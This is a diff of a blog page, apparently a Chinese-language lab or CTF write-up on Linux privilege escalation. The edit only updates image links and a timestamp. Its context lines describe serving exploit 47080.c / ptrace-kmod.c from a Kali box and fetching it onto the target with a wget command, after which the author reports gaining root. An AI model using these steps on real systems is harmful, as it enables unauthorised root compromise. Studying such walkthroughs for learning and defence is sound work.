@@ -37,7 +37,7 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823114242.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823123517.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823124007.png">
-<meta property="og:image" content="c:/Users/10913/AppData/Roaming/Typora/typora-user-images/image-20230823124157212.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823135906.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823124532.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823125105.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823125355.png">
@@ -46,7 +46,7 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823133557.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823135105.png">
 <meta property="article:published_time" content="2023-08-22T14:24:19.000Z">
-<meta property="article:modified_time" content="2023-08-23T05:52:18.326Z">
+<meta property="article:modified_time" content="2023-08-23T05:59:17.843Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230822222618.png">
@@ -330,7 +330,7 @@
 <p>所以就要下载对应的文件,这里先把47080.c给拿到本机来检查一下(刚好可以用昨天学的python http传文件 8000端口)</p>
 <p>ctrl F查找</p>
 <p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823124007.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="C:/Users/10913/AppData/Roaming/Typora/typora-user-images/image-20230823124157212.png" srcset="/img/loading.gif" lazyload alt="image-20230823124157212"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823135906.png" srcset="/img/loading.gif" lazyload></p>
 <p>kali能下,但是靶机下不下来,那就传过去,</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget 192.168.49.130:8000/ptrace-kmod.c<br></code></pre></td></tr></table></figure>
 <p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823124532.png" srcset="/img/loading.gif" lazyload>成功下下来了<br><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823125105.png" srcset="/img/loading.gif" lazyload>ok,root权限到手,之前的原因是,那个cpp脚本会自动下载对应的库(应该是,或者说别的依赖)并进行编译,但是那边网络连接不了,下不下来那个文件,那我们就自己下下来并传上去,然后就ok了</p>
